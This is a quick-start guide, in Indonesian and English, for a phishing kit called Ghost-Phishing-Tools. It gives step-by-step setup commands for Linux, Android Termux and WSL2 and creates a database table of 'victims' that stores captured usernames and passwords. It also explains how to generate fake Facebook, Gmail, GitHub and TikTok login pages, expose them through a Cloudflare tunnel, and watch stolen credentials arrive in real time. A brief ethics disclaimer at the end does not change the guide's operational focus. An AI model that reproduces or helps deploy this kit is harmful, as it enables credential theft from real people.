# 🚀 Quick Start Guide - Ghost-Phishing-Tools

Panduan cepat untuk mulai menggunakan Ghost-Phishing-Tools dalam 5 menit!

---

## ⚡ Super Quick Setup (Linux)

```bash
# 1. Clone repository
git clone https://github.com/Sneijderlino/Ghost-Phishing-Tools.git
cd Ghost-Phishing-Tools

# 2. Install dependencies (Ubuntu/Debian)
sudo apt update && sudo apt install -y \
  php php-cli php-mysql mysql-server
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-amd64.deb
sudo apt install -y ./cloudflared-linux-amd64.deb

# 3. Setup database
sudo mysql -u root << 'EOF'
CREATE DATABASE ghost_audit;
CREATE TABLE ghost_audit.victims (
  id INT AUTO_INCREMENT PRIMARY KEY,
  platform VARCHAR(50),
  ip_address VARCHAR(45),
  username VARCHAR(255),
  password VARCHAR(255),
  user_agent TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
EOF

# 4. Start service
sudo service mysql start

# 5. Run tool
chmod +x Ghost-Phishing-Tools.sh
./Ghost-Phishing-Tools.sh
```

---

## 📱 Quick Setup (Termux - Android)

```bash
# 1. Install Termux from F-Droid
# https://f-droid.org/en/packages/com.termux/

# 2. In Termux terminal:
pkg update && pkg upgrade -y
pkg install -y git php php-mysql mariadb

# 3. Setup
git clone https://github.com/Sneijderlino/Ghost-Phishing-Tools.git
cd Ghost-Phishing-Tools

# Download ARM64 cloudflared
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-arm64
chmod +x cloudflared-linux-arm64
mv cloudflared-linux-arm64 $PREFIX/bin/cloudflared

# 4. Initialize DB
mariadbd &
sleep 3
mysql -u root << 'EOF'
CREATE DATABASE ghost_audit;
CREATE TABLE ghost_audit.victims (
  id INT AUTO_INCREMENT PRIMARY KEY,
  platform VARCHAR(50),
  ip_address VARCHAR(45),
  username VARCHAR(255),
  password VARCHAR(255),
  user_agent TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
EOF

# 5. Run
./Ghost-Phishing-Tools.sh
```

---

## 🪟 Quick Setup (Windows with WSL2)

```bash
# 1. Enable WSL2 (PowerShell as Admin)
wsl --install -d Ubuntu-22.04

# 2. In WSL terminal:
sudo apt update && sudo apt install -y \
  php php-cli php-mysql mysql-server
wget https://github.com/cloudflare/cloudflared/releases/download/2024.1.0/cloudflared-linux-amd64.deb
sudo apt install -y ./cloudflared-linux-amd64.deb

# 3-5. Same as Linux setup above
```

---

## 🎯 First Usage (Semua Platform)

```
1. Tool akan show menu utama
2. Pilih [1] untuk buat Facebook template
3. Tunggu sampai selesai (~10 detik)
4. Pilih [3] untuk jalankan server
5. Copy URL yang ditampilkan
6. Test dengan akses URL dari browser
7. Verifikasi data tertangkap di logs
```

---

## 📋 Menu Quick Reference

```
[1] BUAT TEMPLATE OTOMATIS
    ├─ [1] Facebook
    ├─ [2] Gmail (Google)
    ├─ [3] GitHub
    └─ [4] TikTok

[2] KONEKSIKAN WEB CUSTOM
    └─ Untuk HTML/CSS/JS custom

[3] JALANKAN EXPLOIT SERVER
    └─ Mulai server & tunnel

[0] KELUAR
    └─ Exit tool
```

---

## 🔗 Quick Links

- **Full Documentation**: [README.md](README.md)
- **Installation Guide**: [INSTALLATION.md](INSTALLATION.md)
- **Contributing**: [CONTRIBUTING.md](CONTRIBUTING.md)
- **Security**: [SECURITY.md](SECURITY.md)

---

## ❓ Common Issues Quick Fix

### Port 8888 Already in Use

```bash
sudo lsof -i :8888
sudo kill -9 <PID>
```

### MySQL Connection Error

```bash
sudo service mysql start
# Or in Termux:
mariadbd &
```

### Cloudflare Tunnel Timeout

```bash
# Check internet connection
ping cloudflare.com

# Update tool
git pull origin main
```

### Bash: Permission Denied

```bash
chmod +x Ghost-Phishing-Tools.sh
sudo ./Ghost-Phishing-Tools.sh
```

---

## 🎓 Learning Path

### Beginner

1. ✅ Complete este Quick Start
2. ✅ Read [README.md](README.md)
3. ✅ Try option [1] (Create template)
4. ✅ Try option [3] (Run server)

### Intermediate

1. ✅ Read [INSTALLATION.md](INSTALLATION.md)
2. ✅ Try option [2] (Custom web)
3. ✅ Explore database logging
4. ✅ Read [SECURITY.md](SECURITY.md)

### Advanced

1. ✅ Modify script untuk needs Anda
2. ✅ Create custom templates
3. ✅ Setup enterprise deployment
4. ✅ Contribute improvements

---

## 💡 Tips & Tricks

### Tip #1: Use Custom Domain

```bash
# By default uses Cloudflare tunnel
# For custom domain, modify ke line 165 dari script
```

### Tip #2: Monitor Logs Real-time

```bash
# Dalam terminal kedua:
tail -f database_audit.txt
```

### Tip #3: Database Backup

```bash
mysqldump ghost_audit > backup.sql
# Restore:
mysql ghost_audit < backup.sql
```

### Tip #4: Run in Background (Termux)

```bash
nohup ./Ghost-Phishing-Tools.sh > ghost.log 2>&1 &
```

---

## 🔐 Security Reminders

⚠️ **IMPORTANT**:

- ✅ Always get written authorization sebelum testing
- ✅ Only test pada authorized systems
- ✅ Keep credentials secure
- ✅ Delete data setelah testing
- ✅ Check applicable laws in your jurisdiction

---

## 🆘 Need Help?

- 📖 Full docs: [README.md](README.md)
- 🐛 Report bugs: [GitHub Issues](https://github.com/Sneijderlino/Ghost-Phishing-Tools/issues)
- 💬 Ask questions: [GitHub Discussions](https://github.com/Sneijderlino/Ghost-Phishing-Tools/discussions)
- 🔒 Security issues: security@sneijderlino.com

---

**Selamat datang ke Ghost-Phishing-Tools! Happy learning! 🎉**

**Ingat**: Ethical hacking dimulai dengan integritas dan kepatuhan hukum! 🔐
